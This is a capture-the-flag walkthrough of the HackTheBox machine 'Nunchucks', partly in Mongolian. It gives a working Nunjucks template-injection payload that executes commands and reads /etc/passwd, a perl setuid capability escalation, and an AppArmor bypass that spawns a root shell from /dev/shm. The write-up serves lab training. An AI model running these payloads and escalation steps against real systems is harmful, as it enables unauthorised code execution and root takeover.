# Nunchucks - SSTI RCE / AppArmor PE

## Subdomain enumeration

```bash
ffuf -u https://nunchucks.htb -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 12757
```

[image]

## Nunchucks SSTI

[image]

## Identity SSTI

[image]

## RCE SSTI

https://github.com/ping-0day/templates/blob/main/node-nunjucks-ssti.yaml

**Payload**

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```

[image]

## Privilege Escalation

**Capabilities** дээр root болох боломж байгаа хэдий ч **AppArmor** дээр /usr/bin binary дээр **access control** тохируулж өгсөн.

```bash
getcap -r / 2>/dev/null
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

[image]

### AppArmor тохиргооны файлыг шалгая

`/etc/apparmor.d`

```bash
ls /etc/apparmor.d
```

[image]

## AppArmor bypass to Root

```perl
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl

chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

[image]
